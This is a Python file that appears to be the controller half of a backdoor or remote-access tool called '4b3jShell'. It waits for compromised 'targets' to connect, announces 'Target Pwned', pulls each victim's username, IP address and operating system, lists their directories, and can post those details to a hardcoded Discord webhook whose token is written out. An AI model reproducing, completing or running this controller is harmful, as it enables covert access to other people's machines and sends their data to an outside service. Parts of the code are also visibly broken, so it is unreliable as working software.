import requests
import socket


o_lo = """
                                                                                                                                              
                 bbbbbbbb                                                                                                                     
       444444444 b::::::b             333333333333333     jjjj         SSSSSSSSSSSSSSS hhhhhhh                                lllllll lllllll 
      4::::::::4 b::::::b            3:::::::::::::::33  j::::j      SS:::::::::::::::Sh:::::h                                l:::::l l:::::l 
     4:::::::::4 b::::::b            3::::::33333::::::3  jjjj      S:::::SSSSSS::::::Sh:::::h                                l:::::l l:::::l 
    4::::44::::4  b:::::b            3333333     3:::::3            S:::::S     SSSSSSSh:::::h                                l:::::l l:::::l 
   4::::4 4::::4  b:::::bbbbbbbbb                3:::::3jjjjjjj     S:::::S             h::::h hhhhh           eeeeeeeeeeee    l::::l  l::::l 
  4::::4  4::::4  b::::::::::::::bb              3:::::3j:::::j     S:::::S             h::::hh:::::hhh      ee::::::::::::ee  l::::l  l::::l 
 4::::4   4::::4  b::::::::::::::::b     33333333:::::3  j::::j      S::::SSSS          h::::::::::::::hh   e::::::eeeee:::::eel::::l  l::::l 
4::::444444::::444b:::::bbbbb:::::::b    3:::::::::::3   j::::j       SS::::::SSSSS     h:::::::hhh::::::h e::::::e     e:::::el::::l  l::::l 
4::::::::::::::::4b:::::b    b::::::b    33333333:::::3  j::::j         SSS::::::::SS   h::::::h   h::::::he:::::::eeeee::::::el::::l  l::::l 
4444444444:::::444b:::::b     b:::::b            3:::::3 j::::j            SSSSSS::::S  h:::::h     h:::::he:::::::::::::::::e l::::l  l::::l 
          4::::4  b:::::b     b:::::b            3:::::3 j::::j                 S:::::S h:::::h     h:::::he::::::eeeeeeeeeee  l::::l  l::::l 
          4::::4  b:::::b     b:::::b            3:::::3 j::::j                 S:::::S h:::::h     h:::::he:::::::e           l::::l  l::::l 
          4::::4  b:::::bbbbbb::::::b3333333     3:::::3 j::::j     SSSSSSS     S:::::S h:::::h     h:::::he::::::::e         l::::::ll::::::l
        44::::::44b::::::::::::::::b 3::::::33333::::::3 j::::j     S::::::SSSSSS:::::S h:::::h     h:::::h e::::::::eeeeeeee l::::::ll::::::l
        4::::::::4b:::::::::::::::b  3:::::::::::::::33  j::::j     S:::::::::::::::SS  h:::::h     h:::::h  ee:::::::::::::e l::::::ll::::::l
        4444444444bbbbbbbbbbbbbbbb    333333333333333    j::::j      SSSSSSSSSSSSSSS    hhhhhhh     hhhhhhh    eeeeeeeeeeeeee llllllllllllllll
                                                         j::::j                                                                               
                                               jjjj      j::::j                                                                               
                                              j::::jj   j:::::j                                                                               
                                              j::::::jjj::::::j                                                                               
                                               jj::::::::::::j                                                                                
                                                 jjj::::::jjj                                                                                 
                                                    jjjjjj                                                                          
"""


WEBHOOK = "https://discord.com/api/webhooks/1003802181276803073/B64-bPViJY73BRVzJ817gvfLbrPdNw26WPUxfpzumBge_WhSHoYHRpOrQsrHMURgxX34"
DISCORD_NOTF = False

global C_SERVER
global C_PORT   


# Send data to webhook using discord
class DiscordNotifyData:
    async def d_notify(sen):
        data = {"content": f"{sen}"}
        res = requests.post(WEBHOOK, json=data, headers={'Content-Type': 'application/json'})
        if 200 < res.status_code < 299:
            print("Sent Response")
        else:
            print(res.status_code)
 

class ServerSetup:
    def __init__(self):
        self.s_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_for_clients()

    def on_connect(user, ip, osIn):
        send_d = f"Connection Success\nFrom {user}\nOn {ip}\nUsing {osIn}"
        DiscordNotifyData.d_notify(send_d)


    def listen_for_clients(self):
        # Bind server
        self.s_socket.bind((C_SERVER, C_PORT))
        print("Listen for targets now")
        # Then listen for a connection
        self.s_socket.listen()

        # If get a connection accept it 
        conn, addr = self.s_socket.accept()
        print(f"Connection from {addr}")

        # Here it tests if the connection was successful by sending data to target to see if it gets right response that it should
        conn.send(b"TEST")
        if conn.recv(1024).decode("UTF-8") == "CONNECTED":
            print("Target Pwned :)")
        else:
            print("TEST FAILED, TRY AGAIN?")
            return

        # Get user on target
        conn.send(b"user")
        user = conn.recv(1024).decode("UTF-8")
        conn.send(b"ip")
        ip = conn.recv(1024).decode("UTF-8")
        conn.send(b"osIn")
        osIn = conn.recv(1024).decode("UTF-8")

        if user.startswith("Username") == False:
            user = "Username Error"
        elif ip.startswith("IP") == False:
            ip = "IP Error"
        elif osIn.startswith("Platform") == False:
            osIn = "Platform Error"

        # Send data to webhook to notify server 
        if DISCORD_NOTF == True:
            ServerSetup.on_connect(user, ip, osIn)

        commands = {"help": "Displays information on commands and extras", "user":"Get username of targets machine", "check":"Checks if still connected to target"}

        print("Type help for commands")
        while True:
            cmd = input("What command would you like to send? ")

            cmd.replace(" ", "")

            if cmd == "help":
                the_cmd = f"{commands}"
                print(the_cmd.replace("{", "").replace("}", "").replace(",", "\n"))
            if cmd == "user":
                print(user)
            if cmd == "check":
                conn.send(b"check")
                if conn.recv(1024).decode("UTF-8") == "checked":
                    print(f"{ip} Is Still Connected")
                else:
                    print("Connection failed, please try connecting again!")
                    break
            if cmd == "close":
                conn.send(b"close")
                conn.close()
                print("Connection Closed https://github.com/4b3j Coded")
                break
            if cmd == "listdir":
                conn.send(b"listdir")
                print(f"{conn.recv(1024).decode('UTF-8')}")
            


if __name__ == "__main__":
    reque = requests.get("https://discord.com")
    
    if reque != 200:
      DISCORD_NOTF = False
    
    C_SERVER    = "127.0.0.1"
    C_PORT      = 3334 
    print(o_lo)
    print("                                                 Welcome User                  ")
    ServerSetup()
